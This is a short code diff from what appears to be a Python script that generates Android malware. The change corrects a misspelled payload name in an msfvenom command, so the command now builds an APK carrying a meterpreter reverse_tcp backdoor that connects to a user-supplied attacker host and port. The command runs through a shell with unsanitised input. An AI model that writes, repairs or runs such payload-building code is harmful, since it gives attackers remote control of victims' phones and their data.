@@ -102,7 +102,7 @@ def android(namder):
         name = str(input('name_file: '))
 
         subprocess.check_output(
-            f'msfvenom -p andriod/meterpreter/reverse_tcp lhost={host} lport={port} > {directory}{name}.apk', shell=True)
+            f'msfvenom -p android/meterpreter/reverse_tcp lhost={host} lport={port} > {directory}{name}.apk', shell=True)
     
     elif namder == 2:
         host = str(input('lhost: '))
